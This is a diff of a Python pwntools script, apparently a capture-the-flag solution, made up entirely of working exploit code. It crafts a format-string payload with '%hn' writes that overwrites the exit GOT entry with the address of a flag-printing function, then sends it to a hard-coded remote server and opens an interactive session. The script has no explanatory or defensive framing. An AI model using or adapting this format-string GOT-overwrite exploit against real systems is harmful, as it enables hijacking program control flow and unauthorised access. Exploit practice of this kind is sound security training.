@@ -3,25 +3,30 @@
 # 0x404038 <exit@got.plt>:        0x00401070
 
 import struct 
-from pwn import *
+import socket
+import pwn
 
 flag_func = 0x4011b6
-EXIT_PLT = 0x0000000000404038
+EXIT_PLT = 0x404038
 # vuln = 0x4011d4 
 # EXIT_PLT = 0x8049724
 
 def pad(s):
-    return s+"X"*(512-len(s))
+    return s+"X"*(512-len(s)-16)
 
-# print(bytes.fromhex(EXIT_PLT))
-a = struct.pack("I",EXIT_PLT)
-print(a)
-# b = struct.unpack("I", a)
-# print(hex(b[0]))
-# print(bytes([EXIT_PLT]))
 exploit = ""
-exploit += "8@@\x00"
-exploit += "AAAABBBBCCCC"
-exploit += "%6$n "*4
+exploit += "AAAAAAAA"
+exploit += "%{}x".format(0x11b6-len(exploit))
+exploit += "%68$hn"
 
-print(pad(exploit))
+exploit = pad(exploit)
+exploit += (struct.pack('Q', EXIT_PLT)).decode()
+
+target_host = "140.113.207.240" 
+target_port = 8835
+conn = pwn.remote(target_host, target_port)
+conn.recvuntil("Give me some goodies:")
+
+conn.send(exploit+'\n')
+
+conn.interactive()
